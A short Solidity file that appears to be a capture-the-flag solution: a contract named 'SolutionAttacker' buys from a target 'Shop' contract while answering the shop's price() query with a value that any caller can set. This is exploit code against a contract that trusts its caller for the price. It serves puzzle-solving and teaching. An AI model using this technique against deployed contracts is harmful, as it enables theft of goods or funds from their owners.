pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
}


contract SolutionAttacker {
    uint256 public myPrice = 100;

    function setPrice(uint256 newPrice) public {
        myPrice = newPrice;
    }

    function buyItem(address shop) public {
        Shop(shop).buy();
    }

    function price() external view returns (uint256) {
        return myPrice;
    }
}